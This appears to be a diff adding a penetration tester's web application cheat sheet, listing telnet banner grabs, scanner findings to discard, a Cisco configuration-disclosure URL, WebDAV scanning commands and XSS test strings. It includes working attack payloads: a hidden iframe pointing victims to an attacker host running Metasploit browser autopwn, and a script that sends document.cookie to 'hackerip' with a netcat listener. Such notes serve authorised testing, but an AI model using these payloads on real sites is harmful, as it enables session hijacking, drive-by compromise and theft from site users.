@@ -1,0 +1,84 @@
+Web Apps
+
+
+# Apache version, eTag, HTTP Basic Authentication Enabled
+
+telnet <IP> 80
+HEAD / HTTP/1.0
+(hit enter 2x)
+------------------------------------------------------------------------------------------------------
+
+# AppScan - delete the following:
+
+Cacheable SSL Page Found
+Client Side (JavaScript) Cookie Reference
+Email Address Pattern Found
+Hidden Directory Detected
+Query Parameter in SSL Request
+Robots.txt
+SSL Certificate Domain Name Mismatch
+------------------------------------------------------------------------------------------------------
+
+# Browser Redirection
+
+<iframe SRC="http://hackerip/report" height = "0" width ="0">
+hacker:  use Metasploit browser autopwn listening on hackerip
+------------------------------------------------------------------------------------------------------
+
+# Cisco
+
+$NUMBER is between 16 and 99.
+http://routerIP/level/$NUMBER/exec/show/configuration
+------------------------------------------------------------------------------------------------------
+
+# Cookie Security Issues - missing HttpOnly or Secure attribute
+
+Firefox
+Cookies > View Cookie Information
+HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not return a value.
+------------------------------------------------------------------------------------------------------
+
+# Cookie Stealing
+
+<script>new Image().src="http://hackerip/woot.php?"+ document.cookie;</script>
+hacker:  nc -lvp 80
+------------------------------------------------------------------------------------------------------
+
+# Shows cookies, eTag and modules installed
+
+for i in `cat 80.txt` ; do curl -iskXHEAD http://$i/ > $i 2>&1 ; echo Scanned $i ; done
+------------------------------------------------------------------------------------------------------
+
+# TRACE / TRACK methods allowed
+
+telnet <IP> 80
+OPTIONS / HTTP/1.0
+(hit enter 2x)
+------------------------------------------------------------------------------------------------------
+
+# WebDAV extensions are enabled
+
+msfconsole
+use auxiliary/scanner/http/webdav_scanner
+
+./davtest.pl -url http://target-IP
+
+for i in $(cat 80.txt); do cadaver -t $i; done
+------------------------------------------------------------------------------------------------------
+
+# XSS
+
+http://target.com/index.php?user=<script>alert(123)</script>
+http://target.com/index.php?user=<script>Test_XSS</script>
+curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
+
+<script>("Test_XSS")</script>
+
+<script>alert(123)</script>        Or try inserting a NULL byte:  %00<script>alert(123)</script> 
+
+http://target.com/index.php?user=<script>alert(123)</script>
+<script>('Test XSS')</script>
+
+curl https://target.com/login.php?user=`perl –e 'print "a" x 500'`
+This locator in particular is good. '';!--"<XSS>=&{()}
+I would probably change it. '';!--"<a2S>=&{()}
